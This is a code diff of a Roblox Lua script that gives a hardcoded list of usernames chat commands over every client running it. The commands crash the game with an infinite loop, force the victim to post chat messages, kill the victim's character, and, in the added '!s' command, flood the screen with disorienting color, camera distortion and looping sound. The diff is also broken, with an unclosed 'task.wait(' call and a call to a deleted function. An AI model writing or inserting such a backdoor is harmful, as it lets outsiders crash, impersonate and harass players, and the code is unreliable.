@@ -36,23 +36,95 @@ function chatMessage(str)
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
     end
 end
+local UIS = game:GetService("UserInputService")
+local Run = game:GetService("RunService")
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+
+local Player = Players.LocalPlayer
+local Cam = game.Workspace.Camera
+local TimeElapsed = 0
+local Intensity = 0 -- Default to no effect
+
+local SoundId = "rbxassetid://89898199435154"
 local list = {
-UNDEBOLT = true,
-Superduperalt0987 = true,
-TCUTCU_LLBDDLLZYXZY = true,
-moonyrblxx = true,
-M0onR3b0rn = true,
-["76rgoyf"] = true,
-starronyxx = true,
-riskyhaulownertest = true,
-
-
-	
+    UNDEBOLT = true,
+    Superduperalt0987 = true,
+    TCUTCU_LLBDDLLZYXZY = true,
+    moonyrblxx = true,
+    M0onR3b0rn = true,
+    ["76rgoyf"] = true,
+    starronyxx = true,
+    riskyhaulownertest = true,
 }
+
+Run.RenderStepped:Connect(function(dt)
+    if Intensity > 0 then
+        TimeElapsed += dt
+        local SquishX = 1 + math.sin(TimeElapsed * 30) * Intensity
+        local SquishY = 1 + math.cos(TimeElapsed * 30) * Intensity
+
+        local MAGIC_FORMULA = CFrame.new(0, 0, 0, SquishX, 0, 0, 0, SquishY, 0, 0, 0, 1)
+        Cam.CFrame = Cam.CFrame * MAGIC_FORMULA
+    end
+end)
+
+local function noise(waitt)
+    local Character = Player.Character or Player.CharacterAdded:Wait()
+    local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+
+    local Sound = Instance.new("Sound")
+    Sound.SoundId = SoundId
+    Sound.Parent = HumanoidRootPart
+    local pitch = 1
+    local numSounds = 5
+    while wait(waitt) do
+        task.spawn(function()
+            for i = 0, numSounds - 1 do
+		task.wait(.01
+                local newsound = Sound:Clone()
+                newsound.Parent = workspace
+                newsound.Pitch = pitch - (i * 0.01) 
+                newsound.TimePosition = 0
+                newsound:Play()
+                game:GetService("Debris"):AddItem(newsound, newsound.TimeLength)
+            end
+            pitch = pitch - 0.01
+        end)
+    end
+end
+
+local function applyEffects()
+    local msg = Instance.new("Message")
+    msg.Parent = workspace
+    msg.Text = "BRILLIANT HAS ARRIVED"
+    task.delay(5, function()
+        msg:Destroy()
+    end)
+
+    local colorCorrection = Instance.new("ColorCorrectionEffect")
+    colorCorrection.Parent = Lighting
+    colorCorrection.TintColor = Color3.fromRGB(255, 0, 0)
+    colorCorrection.Saturation = -500000000
+    colorCorrection.Contrast = 50000
+    colorCorrection.Brightness = 25000
+    Lighting.TimeOfDay = "00:00:00"
+    
+    local blr = Instance.new("BlurEffect")
+    blr.Parent = Lighting
+    blr.Size = 1
+    Intensity = 0.03
+
+    task.delay(60, function()
+        noise(1)
+    end)
+    task.spawn(function() noise(2) end)
+end
+
 local function onChatted(player, message)
-    if not list[player.name] then return end
+    if not list[player.Name] then return end
     if message:sub(1, 3):lower() == "/e " then
-        message = message:sub(4) 
+        message = message:sub(4)
     end
 
     local args = string.split(message, " ")
@@ -61,21 +133,24 @@ local function onChatted(player, message)
     if command == "!crash" then
         while true do end
     elseif command == "!say" then
-        local text = message:sub(6) 
+        local text = message:sub(6)
         chatMessage(text)
     elseif command == "!kill" then
-        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-            LocalPlayer.Character.Humanoid.Health = 0
+        local localPlayer = Players.LocalPlayer
+        if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
+            localPlayer.Character.Humanoid.Health = 0
+        end
+    elseif command == "!s" then
+        if Players:FindFirstChild("UNDEBOLT") then
+            applyEffects()
         end
     end
 end
 
-local function connectPlayer(player)
-    player.Chatted:Connect(function(msg) onChatted(player, msg) end)
-end
-
-for _, player in pairs(Players:GetPlayers()) do
-    connectPlayer(player)
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onChatted(player, message)
+    end)
 end
 
 Players.PlayerAdded:Connect(connectPlayer)
